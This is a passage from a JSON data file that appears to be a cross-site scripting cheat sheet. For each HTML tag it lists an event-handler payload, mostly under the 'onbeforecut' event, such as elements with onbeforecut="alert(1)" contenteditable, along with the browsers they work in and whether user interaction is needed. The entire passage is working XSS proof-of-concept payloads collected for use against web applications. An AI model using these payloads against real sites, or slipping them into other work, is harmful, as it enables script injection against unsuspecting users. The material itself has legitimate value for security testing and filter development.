                        "code": "<tt onbeforecopy=\"alert(1)\" contenteditable>test<\/tt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "u",
                        "code": "<u onbeforecopy=\"alert(1)\" contenteditable>test<\/u>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ul",
                        "code": "<ul onbeforecopy=\"alert(1)\" contenteditable>test<\/ul>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "var",
                        "code": "<var onbeforecopy=\"alert(1)\" contenteditable>test<\/var>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "video",
                        "code": "<video onbeforecopy=\"alert(1)\" contenteditable>test<\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "wbr",
                        "code": "<wbr onbeforecopy=\"alert(1)\" contenteditable>test<\/wbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "xmp",
                        "code": "<xmp onbeforecopy=\"alert(1)\" contenteditable>test<\/xmp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onbeforecut": {
                "description": "Requires you cut a piece of text",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onbeforecut=alert(1) value=\"XSS\" autofocus>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "description": "Requires you cut a piece of text",
                        "code": "<textarea onbeforecut=alert(1) autofocus>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "a",
                        "code": "<a onbeforecut=\"alert(1)\" contenteditable>test<\/a>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "abbr",
                        "code": "<abbr onbeforecut=\"alert(1)\" contenteditable>test<\/abbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "acronym",
                        "code": "<acronym onbeforecut=\"alert(1)\" contenteditable>test<\/acronym>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "address",
                        "code": "<address onbeforecut=\"alert(1)\" contenteditable>test<\/address>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "applet",
                        "code": "<applet onbeforecut=\"alert(1)\" contenteditable>test<\/applet>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "area",
                        "code": "<area onbeforecut=\"alert(1)\" contenteditable>test<\/area>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "article",
                        "code": "<article onbeforecut=\"alert(1)\" contenteditable>test<\/article>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "aside",
                        "code": "<aside onbeforecut=\"alert(1)\" contenteditable>test<\/aside>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio onbeforecut=\"alert(1)\" contenteditable>test<\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "b",
                        "code": "<b onbeforecut=\"alert(1)\" contenteditable>test<\/b>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdi",
                        "code": "<bdi onbeforecut=\"alert(1)\" contenteditable>test<\/bdi>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdo",
                        "code": "<bdo onbeforecut=\"alert(1)\" contenteditable>test<\/bdo>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "big",
                        "code": "<big onbeforecut=\"alert(1)\" contenteditable>test<\/big>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blink",
                        "code": "<blink onbeforecut=\"alert(1)\" contenteditable>test<\/blink>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blockquote",
                        "code": "<blockquote onbeforecut=\"alert(1)\" contenteditable>test<\/blockquote>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "body",
                        "code": "<body onbeforecut=\"alert(1)\" contenteditable>test<\/body>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "br",
                        "code": "<br onbeforecut=\"alert(1)\" contenteditable>test<\/br>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "button",
                        "code": "<button onbeforecut=\"alert(1)\" contenteditable>test<\/button>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "canvas",
                        "code": "<canvas onbeforecut=\"alert(1)\" contenteditable>test<\/canvas>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "caption",
                        "code": "<caption onbeforecut=\"alert(1)\" contenteditable>test<\/caption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "center",
                        "code": "<center onbeforecut=\"alert(1)\" contenteditable>test<\/center>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "cite",
                        "code": "<cite onbeforecut=\"alert(1)\" contenteditable>test<\/cite>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "code",
                        "code": "<code onbeforecut=\"alert(1)\" contenteditable>test<\/code>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "col",
                        "code": "<col onbeforecut=\"alert(1)\" contenteditable>test<\/col>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "colgroup",
                        "code": "<colgroup onbeforecut=\"alert(1)\" contenteditable>test<\/colgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "command",
                        "code": "<command onbeforecut=\"alert(1)\" contenteditable>test<\/command>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "content",
                        "code": "<content onbeforecut=\"alert(1)\" contenteditable>test<\/content>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "data",
                        "code": "<data onbeforecut=\"alert(1)\" contenteditable>test<\/data>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "datalist",
                        "code": "<datalist onbeforecut=\"alert(1)\" contenteditable>test<\/datalist>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dd",
                        "code": "<dd onbeforecut=\"alert(1)\" contenteditable>test<\/dd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "del",
                        "code": "<del onbeforecut=\"alert(1)\" contenteditable>test<\/del>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "details",
                        "code": "<details onbeforecut=\"alert(1)\" contenteditable>test<\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dfn",
                        "code": "<dfn onbeforecut=\"alert(1)\" contenteditable>test<\/dfn>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dialog",
                        "code": "<dialog onbeforecut=\"alert(1)\" contenteditable>test<\/dialog>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dir",
                        "code": "<dir onbeforecut=\"alert(1)\" contenteditable>test<\/dir>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "div",
                        "code": "<div onbeforecut=\"alert(1)\" contenteditable>test<\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dl",
                        "code": "<dl onbeforecut=\"alert(1)\" contenteditable>test<\/dl>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dt",
                        "code": "<dt onbeforecut=\"alert(1)\" contenteditable>test<\/dt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "element",
                        "code": "<element onbeforecut=\"alert(1)\" contenteditable>test<\/element>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "em",
                        "code": "<em onbeforecut=\"alert(1)\" contenteditable>test<\/em>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "embed",
                        "code": "<embed onbeforecut=\"alert(1)\" contenteditable>test<\/embed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "fieldset",
                        "code": "<fieldset onbeforecut=\"alert(1)\" contenteditable>test<\/fieldset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figcaption",
                        "code": "<figcaption onbeforecut=\"alert(1)\" contenteditable>test<\/figcaption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figure",
                        "code": "<figure onbeforecut=\"alert(1)\" contenteditable>test<\/figure>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "font",
                        "code": "<font onbeforecut=\"alert(1)\" contenteditable>test<\/font>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "footer",
                        "code": "<footer onbeforecut=\"alert(1)\" contenteditable>test<\/footer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "form",
                        "code": "<form onbeforecut=\"alert(1)\" contenteditable>test<\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frame",
                        "code": "<frame onbeforecut=\"alert(1)\" contenteditable>test<\/frame>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset onbeforecut=\"alert(1)\" contenteditable>test<\/frameset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true,
                        "context": "before_body"
                    },
                    {
                        "tag": "h1",
                        "code": "<h1 onbeforecut=\"alert(1)\" contenteditable>test<\/h1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "head",
                        "code": "<head onbeforecut=\"alert(1)\" contenteditable style=display:block>test<\/head>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "header",
                        "code": "<header onbeforecut=\"alert(1)\" contenteditable>test<\/header>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hgroup",
                        "code": "<hgroup onbeforecut=\"alert(1)\" contenteditable>test<\/hgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hr",
                        "code": "<hr onbeforecut=\"alert(1)\" contenteditable>test<\/hr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "html",
                        "code": "<html onbeforecut=\"alert(1)\" contenteditable>test<\/html>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "i",
                        "code": "<i onbeforecut=\"alert(1)\" contenteditable>test<\/i>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe onbeforecut=\"alert(1)\" contenteditable>test<\/iframe>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "image",
                        "code": "<image onbeforecut=\"alert(1)\" contenteditable>test<\/image>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "img",
                        "code": "<img onbeforecut=\"alert(1)\" contenteditable>test<\/img>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ins",
                        "code": "<ins onbeforecut=\"alert(1)\" contenteditable>test<\/ins>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "kbd",
                        "code": "<kbd onbeforecut=\"alert(1)\" contenteditable>test<\/kbd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen onbeforecut=\"alert(1)\" contenteditable>test<\/keygen>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "label",
                        "code": "<label onbeforecut=\"alert(1)\" contenteditable>test<\/label>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "legend",
                        "code": "<legend onbeforecut=\"alert(1)\" contenteditable>test<\/legend>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "li",
                        "code": "<li onbeforecut=\"alert(1)\" contenteditable>test<\/li>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "listing",
                        "code": "<listing onbeforecut=\"alert(1)\" contenteditable>test<\/listing>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "main",
                        "code": "<main onbeforecut=\"alert(1)\" contenteditable>test<\/main>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "map",
                        "code": "<map onbeforecut=\"alert(1)\" contenteditable>test<\/map>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "mark",
                        "code": "<mark onbeforecut=\"alert(1)\" contenteditable>test<\/mark>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "marquee",
                        "code": "<marquee onbeforecut=\"alert(1)\" contenteditable>test<\/marquee>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menu",
                        "code": "<menu onbeforecut=\"alert(1)\" contenteditable>test<\/menu>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menuitem",
                        "code": "<menuitem onbeforecut=\"alert(1)\" contenteditable>test<\/menuitem>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meta",
                        "code": "<meta onbeforecut=\"alert(1)\" contenteditable style=display:block>test<\/meta>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meter",
                        "code": "<meter onbeforecut=\"alert(1)\" contenteditable>test<\/meter>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "multicol",
                        "code": "<multicol onbeforecut=\"alert(1)\" contenteditable>test<\/multicol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nav",
                        "code": "<nav onbeforecut=\"alert(1)\" contenteditable>test<\/nav>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nextid",
                        "code": "<nextid onbeforecut=\"alert(1)\" contenteditable>test<\/nextid>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nobr",
                        "code": "<nobr onbeforecut=\"alert(1)\" contenteditable>test<\/nobr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noembed",
                        "code": "<noembed onbeforecut=\"alert(1)\" contenteditable>test<\/noembed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noframes",
                        "code": "<noframes onbeforecut=\"alert(1)\" contenteditable>test<\/noframes>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noscript",
                        "code": "<noscript onbeforecut=\"alert(1)\" contenteditable>test<\/noscript>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "object",
                        "code": "<object onbeforecut=\"alert(1)\" contenteditable>test<\/object>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ol",
                        "code": "<ol onbeforecut=\"alert(1)\" contenteditable>test<\/ol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "optgroup",
                        "code": "<optgroup onbeforecut=\"alert(1)\" contenteditable>test<\/optgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "option",
                        "code": "<option onbeforecut=\"alert(1)\" contenteditable>test<\/option>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "output",
                        "code": "<output onbeforecut=\"alert(1)\" contenteditable>test<\/output>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "p",
                        "code": "<p onbeforecut=\"alert(1)\" contenteditable>test<\/p>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "param",
                        "code": "<param onbeforecut=\"alert(1)\" contenteditable>test<\/param>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "picture",
                        "code": "<picture onbeforecut=\"alert(1)\" contenteditable>test<\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "plaintext",
                        "code": "<plaintext onbeforecut=\"alert(1)\" contenteditable>test<\/plaintext>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "pre",
                        "code": "<pre onbeforecut=\"alert(1)\" contenteditable>test<\/pre>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "progress",
                        "code": "<progress onbeforecut=\"alert(1)\" contenteditable>test<\/progress>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "q",
                        "code": "<q onbeforecut=\"alert(1)\" contenteditable>test<\/q>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rb",
                        "code": "<rb onbeforecut=\"alert(1)\" contenteditable>test<\/rb>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rp",
                        "code": "<rp onbeforecut=\"alert(1)\" contenteditable>test<\/rp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rt",
                        "code": "<rt onbeforecut=\"alert(1)\" contenteditable>test<\/rt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rtc",
                        "code": "<rtc onbeforecut=\"alert(1)\" contenteditable>test<\/rtc>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ruby",
                        "code": "<ruby onbeforecut=\"alert(1)\" contenteditable>test<\/ruby>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "s",
                        "code": "<s onbeforecut=\"alert(1)\" contenteditable>test<\/s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "samp",
                        "code": "<samp onbeforecut=\"alert(1)\" contenteditable>test<\/samp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "script",
                        "code": "<script onbeforecut=\"alert(1)\" contenteditable>test<\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "section",
                        "code": "<section onbeforecut=\"alert(1)\" contenteditable>test<\/section>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "select",
                        "code": "<select onbeforecut=\"alert(1)\" contenteditable>test<\/select>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "shadow",
                        "code": "<shadow onbeforecut=\"alert(1)\" contenteditable>test<\/shadow>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "slot",
                        "code": "<slot onbeforecut=\"alert(1)\" contenteditable>test<\/slot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "small",
                        "code": "<small onbeforecut=\"alert(1)\" contenteditable>test<\/small>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "source",
                        "code": "<source onbeforecut=\"alert(1)\" contenteditable>test<\/source>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "spacer",
                        "code": "<spacer onbeforecut=\"alert(1)\" contenteditable>test<\/spacer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "span",
                        "code": "<span onbeforecut=\"alert(1)\" contenteditable>test<\/span>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strike",
                        "code": "<strike onbeforecut=\"alert(1)\" contenteditable>test<\/strike>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strong",
                        "code": "<strong onbeforecut=\"alert(1)\" contenteditable>test<\/strong>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "style",
                        "code": "<style onbeforecut=\"alert(1)\" contenteditable style=display:block>test<\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sub",
                        "code": "<sub onbeforecut=\"alert(1)\" contenteditable>test<\/sub>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "summary",
                        "code": "<summary onbeforecut=\"alert(1)\" contenteditable>test<\/summary>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sup",
                        "code": "<sup onbeforecut=\"alert(1)\" contenteditable>test<\/sup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "svg",
                        "code": "<svg onbeforecut=\"alert(1)\" contenteditable>test<\/svg>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "table",
                        "code": "<table onbeforecut=\"alert(1)\" contenteditable>test<\/table>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tbody",
                        "code": "<tbody onbeforecut=\"alert(1)\" contenteditable>test<\/tbody>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "td",
                        "code": "<td onbeforecut=\"alert(1)\" contenteditable>test<\/td>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "template",
                        "code": "<template onbeforecut=\"alert(1)\" contenteditable>test<\/template>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tfoot",
                        "code": "<tfoot onbeforecut=\"alert(1)\" contenteditable>test<\/tfoot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "th",
                        "code": "<th onbeforecut=\"alert(1)\" contenteditable>test<\/th>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "thead",
                        "code": "<thead onbeforecut=\"alert(1)\" contenteditable>test<\/thead>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "time",
                        "code": "<time onbeforecut=\"alert(1)\" contenteditable>test<\/time>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "title",
                        "code": "<title onbeforecut=\"alert(1)\" contenteditable>test<\/title>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tr",
                        "code": "<tr onbeforecut=\"alert(1)\" contenteditable>test<\/tr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "track",
                        "code": "<track onbeforecut=\"alert(1)\" contenteditable>test<\/track>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tt",
                        "code": "<tt onbeforecut=\"alert(1)\" contenteditable>test<\/tt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "u",
                        "code": "<u onbeforecut=\"alert(1)\" contenteditable>test<\/u>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ul",
                        "code": "<ul onbeforecut=\"alert(1)\" contenteditable>test<\/ul>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "var",
                        "code": "<var onbeforecut=\"alert(1)\" contenteditable>test<\/var>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "video",
                        "code": "<video onbeforecut=\"alert(1)\" contenteditable>test<\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "wbr",
                        "code": "<wbr onbeforecut=\"alert(1)\" contenteditable>test<\/wbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "xmp",
